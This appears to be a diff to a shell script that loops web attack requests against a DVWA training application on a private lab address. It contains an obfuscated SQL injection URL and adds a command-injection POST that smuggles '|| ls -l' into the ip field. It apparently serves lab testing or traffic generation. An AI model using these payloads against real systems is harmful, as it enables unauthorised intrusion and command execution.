@@ -7,4 +7,6 @@ do
     sleep 5
     curl http://172.16.1.20/dvwa/vulnerabilities/sqli/?id=%2F*********%2F%27%2F*************%2For%2F************%2F1%3D1%2F***************%2F%3B%23&Submit=Submit#
     sleep 5
+    sudo curl -d "ip=127.0.0.1+%7C%7C+ls+-l+%2Fvar%2Fwww%2Fdvwa%2F" -d "submit=submit" -X POST  http://172.16.1.20/dvwa/vulnerabilities/exec/#
+    sleep 5
 done
